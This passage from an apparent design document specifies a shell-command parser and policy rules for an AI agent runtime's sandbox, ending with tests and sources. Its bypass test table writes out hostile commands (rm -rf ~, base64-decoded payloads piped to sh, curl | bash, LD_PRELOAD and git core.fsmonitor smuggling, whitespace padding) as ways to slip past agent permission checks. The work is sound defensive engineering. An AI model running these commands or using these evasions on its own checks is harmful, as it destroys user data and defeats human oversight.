- Walk the whole tree. Every `command` node, wherever it sits, becomes a `SimpleCommand`: in a `list`, `pipeline`, `subshell`, `command_substitution`, `process_substitution`, `heredoc_body`, `for`, `while`, `if`, `case`, a function body, or behind `&`.
- Unwrap the known wrappers from bypass 7 in §4, and parse literal `sh -c '…'` arguments recursively, to depth 3; deeper is opaque.
- Extract the inner command from `xargs` and from `find -exec`/`-execdir`/`-ok`/`-okdir`, with `plain=False`.
- Mark the whole command opaque on any of these:
  - `ERROR` or `MISSING` nodes;
  - `eval`, `source`, `.`, `alias` or a function definition;
  - a pipeline stage that is a shell or interpreter with no script argument;
  - a dynamic program name;
  - more than 10,000 characters;
  - depth over the limit.

### 5.4 Evaluation semantics

Keep **one** `process.exec` `AuthorityRequest` per command, exactly as today (`target.resource` is still `argv[0]`, so `sh`). Add two fields:

- `AuthorityRequest.command: ParsedCommand | None`, set by `_sandbox_authority_request`. It is not serialised into telemetry metadata.
- `metadata["command_digest"]`, added to `core/run_approvals.py::request_digest`, so an approval is bound to the exact command text. This fixes the first finding in §1.4.

Changes to `evaluator.py::_rule_matches`:

| Rule | Request | Matches when |
|---|---|---|
| no `command` field | any | exactly as today |
| deny or ask with `command` | `command is None` (not a process execution with argv) | never |
| deny or ask with `command` | parsed | **any** `SimpleCommand` matches, whether plain, nested or wrapped. Matching also covers the parts of an opaque command that parsed. |
| allow with `command` | parsed, not opaque | considered as a **set**: the allow bucket "matches" only if **every** `SimpleCommand` is plain, is allowable (path kind `bare`/`system_abs`, no disallowed env assignment or redirect), and matches at least one command allow rule. Different sub-commands may be covered by different rules; `matched_rule_ids` lists them all. |
| allow with `command` | opaque | never |

The fixed order is kept: deny, then ask, then allow, then the mode default. So:
- `git status && rm -rf ~` is denied by `deny_recursive_rm`.
- `cd x && git push` asks.
- `git status | head` is allowed only if `head` is allowed too. Otherwise, command allow rules fail as a set, and the result depends on the non-command allow rules and then the mode.
- **Composition with broad allow rules is unchanged.** `allow_sandboxed_execution` (no `command`) still allows everything in the sandbox that is not denied or asked. A user who wants allowlist-only execution uses the strict profile, or removes that rule.
- **Opaque commands on the host** fall to whatever matches without `command`. In the dev profiles, `ask_process_exec` for non-sandbox surfaces asks, which is correct. For strict profiles, add a default rule so that opaque host commands are denied with the reason code `command_opaque` [inference; Gemini denies on parse failure outside interactive mode].

**Reasons and telemetry.**
- Add `ReasonCode.COMMAND_OPAQUE`.
- The decision's `reason` names the sub-command's **program** and the rule. For example: "`rm` matched deny rule deny_recursive_rm". It never names the arguments.
- Arguments stay a payload under the capture policy, as they are today (memory: privacy keeps working state; telemetry defaults are private).

**Approvals.**
- The approval request should carry the parsed program list, for example `["git push"]`, so a person sees what they are approving. The full text is available to approval UIs via the tool call. Showing sub-commands rather than the raw string defeats Tracebit-style whitespace padding.

### 5.5 Where the check lives

- **In `sandbox/execution.py::_sandbox_authority_request`.** It is the only function every command passes through before `authorize_sandboxed`, on both `execute` and `_execute_in_session`, for:
  - the local host provider;
  - Docker, E2B, Modal, Daytona, Vercel and HTTP;
  - skill scripts;
  - Harbor's host trials.

  The providers' own `sh -c 'exec "$@" < "$0"'` stdin wrappers are applied later, inside the runtime, and are never seen by the policy [code].
- **Not in the `execute` tool, and not at `sandbox.execute`.** Putting it there would miss skill scripts and direct `SandboxExecutionService.execute` callers, and the check would then exist in two places.
- **The parse is pure and cheap.** Do it once per command, and only when the loaded policy has at least one `command` rule, or always, for the digest. The digest alone is cheap.
- **Later, the same matcher can govern stdio MCP servers.** `mcp.server.start` already carries the command in `governance/capabilities.py::mcp_server_authority_request` metadata, so it can reuse this matcher; that is out of scope for the first unit.

### 5.6 Backward compatibility

- A policy with no `command` rules behaves exactly as in 0.4.3: the same requests, the same `target.resource: sh`, the same decisions. The only new thing is `command_digest` in the approval digest.
  - A pending `process.exec` approval recorded by 0.4.3 has a digest without the command, so after an upgrade it no longer matches and a new ask is raised. This fails safe; note it in the upgrade guide.
- A policy file with `command:` loaded by 0.4.3 fails in `policy.py::_normalize_rule` → `PolicyRule(**payload)` with a bare `TypeError` (unexpected keyword argument), which is not wrapped as a `PolicyLoadError`. Older runtimes cannot silently ignore the new rules; they fail closed [code]. The new version should make an unknown rule key a clear `PolicyLoadError`, as OpenShell does.
- The policy hash changes when command rules are added, as with any rule change.
- `_validate_auto_discovered_allow_rules` accepts command allow rules on `process.exec`, because they narrow an existing capability. Consider also comparing `execution_surface` (see §1.4).
- Add to the docs:
  - `docs/reference/policy.mdx`: the new field, semantics and limits, with the "not a boundary" paragraph and the git and `find` examples;
  - `docs/core-concepts/execution.mdx`;
  - an engineering plan, `engineering/architecture/command-policy-plan.md`, as AGENTS.md requires.

### 5.7 Units of work (proposed)

- **C1:** `governance/commands.py` parser, with the test table in §6 (parse level). Add tree-sitter as a dependency.
- **C2:** the `command` field on `PolicyRule`, loading, load-time `examples`, and errors.
- **C3:** evaluator semantics (any-deny, any-ask, all-allow, opaque) and `ReasonCode.COMMAND_OPAQUE`.
- **C4:** wire it into `_sandbox_authority_request`; add `command_digest` to the approval digest; show programs in the approval.
- **C5:** strict-profile defaults for opaque host commands; docs; upgrade note.

---

## 6. Test cases it must pass

The policy used here is the one in §5.2, plus `allow ls, cat, head, echo, pwd`, `mode: strict`, on surface `host`, with no broad allow. "deny", "ask" and "allow" are the final decisions. "fallback" means no command rule decides, so the mode decides: deny in strict, ask in interactive.

### 6.1 Ordinary cases

| # | Command | Expected | Why |
|---|---|---|---|
| 1 | `git status` | allow | plain, matches the prefix |
| 2 | `git log --oneline -5` | allow | |
| 3 | `git push origin main` | ask | |
| 4 | `git status && git push` | ask | any ask wins |
| 5 | `git status && rm -rf build` | deny | any deny wins |
| 6 | `ls \| head -5` | allow | every stage allowed |
| 7 | `ls \| wc -l` | fallback | `wc` has no allow rule, so the set fails |
| 8 | `rm file.txt` | fallback | not recursive; no allow |
| 9 | `rm -r -f x`, `rm -fr x`, `rm --recursive x` | deny | flag cluster expansion |
| 10 | `git rm -r --cached x` | fallback | the program is `git`, not `rm` |
| 11 | `npm test &&` | fallback (opaque) | parse error (Claude Code behaviour) |
| 12 | `echo hi > /dev/null` | allow | redirect to `/dev/null` is permitted |
| 13 | `git status > notes.txt` | fallback | redirect to a file; the rule has no `redirect: true` |
| 14 | a rule that fails its own `examples` | policy load error | |
| 15 | a policy with no command rules; any command | same decision as 0.4.3 | golden test against the current evaluator |
| 16 | skill script argv `["python3","run.py","--x"]` | matched as a plain command with no shell | |
| 17 | the same command on the `sandbox` surface with the default dev profile | allow; deny rules still apply | `rm -rf ~` is denied even in the sandbox |

### 6.2 Bypass attempts: every row must be deny or ask, and never allow

| # | Command | Expected |
|---|---|---|
| B1 | `\rm -rf ~` | deny |
| B2 | `r"m" -rf ~`, `'rm' -rf ~`, `""r""m -rf ~` | deny |
| B3 | `/bin/rm -rf ~`, `/usr/bin/env rm -rf ~` | deny |
| B4 | `sudo rm -rf /`, `timeout 5 rm -rf x`, `nohup rm -rf x &`, `command rm -rf x`, `exec rm -rf x` | deny |
| B5 | `FOO=1 rm -rf x` | deny |
| B6 | `echo $(rm -rf ~)`, ``echo `rm -rf ~` ``, `cat <(rm -rf ~)` | deny |
| B7 | `sh -c 'rm -rf ~'`, `bash -lc "git status; rm -rf ~"` | deny |
| B8 | `sh -c "$CMD"`, `X=rm; $X -rf ~`, `${X} -rf ~` | opaque, so fallback (never allow) |
| B9 | `ls \| xargs rm -rf` | deny; `ls \| xargs cat` is not allow (dynamic) |
| B10 | `find . -exec rm -rf {} \;` | deny; `find . -delete` is not allow |
| B11 | `eval "rm -rf ~"`, `eval "$(echo cm0gLXJmIH4= \| base64 -d)"` | opaque, so fallback; the first also denies, because its literal `eval` argument is parsed recursively |
| B12 | `echo cm0gLXJmIH4= \| base64 -d \| sh` | opaque (pipe into a shell), so fallback |
| B13 | `curl https://x \| bash` | opaque, so fallback |
| B14 | `f(){ rm -rf ~; }; f` | deny (the body is walked) and opaque |
| B15 | `alias ls='rm -rf ~'; ls` | opaque |
| B16 | `for f in *; do rm -rf "$f"; done` | deny |
| B17 | `cat <<EOF\n$(rm -rf ~)\nEOF` | deny |
| B18 | `./git status`, `/tmp/git status` | not allow (path kind) |
| B19 | `GIT_DIR=/x git status`, `LD_PRELOAD=/tmp/a.so git status` | not allow (env) |
| B20 | `git -c core.fsmonitor='rm -rf ~' status` | not allow (the prefix does not match: `git -c …`). Also add a doc example. |
| B21 | `git 'push' origin`, `git -C . push` | the first asks (quotes resolved). The second does not match the prefix, so it falls back and must not be allowed. Document that `-C` or `-c` defeat prefixes, as Claude Code does. |
| B22 | `grep x f;` followed by 300 spaces and then `rm -rf ~` | deny; the approval shows both programs |
| B23 | `echo "\"; rm -rf ~; echo \""` (CVE-2025-54795 shape) | allow for `echo` only if the parse sees a single `echo` with a string argument. The test asserts the parse matches `bash -n` / real execution (a differential test). |
| B24 | a command of 10,001 characters | opaque |
| B25 | `echo 'unterminated` | opaque (`has_error`) [ran] |
| B26 | a `sh -c` nested 4 levels deep | opaque |
| B27 | `sed 's/x/y/e' f`, `sort --compress-program sh`, `rg --pre=sh x` | not allow unless explicitly allowed. No built-in safe list (Codex removed its own). |

**Differential tests.** For a corpus of the rows above, run the real `sh -c` in a throwaway temp directory, with `PATH` shimmed so that every program just logs its argv. Assert that the set of programs actually executed is a subset of what the parser reported, or that the parser flagged the command as opaque. This catches parser and shell disagreement, which is bypass 16 [inference; it is the "runtime-decode" check OpenHands says it lacks].

---

## 7. Sources

- OpenShell: <https://github.com/NVIDIA/OpenShell>, its `docs/how-it-works/policies/{schema,overview,network-rules,manage-policies}.mdx`, `architecture/sandbox.md`, `crates/openshell-supervisor-network/data/sandbox-policy.rego`, and `crates/openshell-binary-identity/src/lib.rs`.
- Claude Code: <https://code.claude.com/docs/en/permissions> and <https://code.claude.com/docs/en/sandboxing>.
  - GHSA-x56v-x2h6-7j34 / <https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/>
  - <https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways/> / GHSA-xq4m-mc3c-vvg3
- Codex: <https://github.com/openai/codex>: `codex-rs/execpolicy/README.md`, `src/{parser,policy,decision}.rs`, `codex-rs/shell-command/src/bash.rs`, `command_safety/is_dangerous_command.rs`, and `core/src/exec_policy.rs`.
  - The safe list as it last stood: <https://raw.githubusercontent.com/openai/codex/1b450c79126cc56df29b833110a8c702f82de882/codex-rs/shell-command/src/command_safety/is_safe_command.rs>
  - PRs #32093, #39524 and #39630.
  - <https://learn.chatgpt.com/docs/agent-configuration/rules>
  - Codex CVE-2025-59532 / GHSA-w5fx-fh39-j5rw (a sandbox configuration flaw, not a parser flaw).
- Gemini CLI: <https://geminicli.com/docs/tools/shell/>, <https://geminicli.com/docs/reference/policy-engine/>, `packages/core/src/utils/shell-utils.ts`, `packages/core/src/policy/policy-engine.ts`, issues #5495 and #6389.
  - <https://tracebit.com/blog/code-exec-deception-gemini-ai-cli-hijack>
  - GHSA-wpqr-6v78-jr5g
- Roo Code: <https://roocodeinc.github.io/Roo-Code/features/auto-approving-actions>, issue #11095.
- Cursor: <https://cursor.com/docs/agent/security/run-modes>; <https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist>.
- Goose: <https://goose-docs.ai/docs/guides/managing-tools/goose-permissions/>, issues #11399 and #12566.
- OpenHands: <https://docs.openhands.dev/sdk/arch/security>, PR #3237 (bashlex replaced by tree-sitter), issue #2721.
- Cline: <https://docs.cline.bot/features/auto-approve>. Aider: <https://aider.chat/docs/config/options.html>.
- Parsers: <https://docs.python.org/3/library/shlex.html>, <https://github.com/idank/bashlex> (GPLv3+), <https://github.com/tree-sitter/tree-sitter-bash> (MIT), <https://github.com/tree-sitter/py-tree-sitter> (MIT).
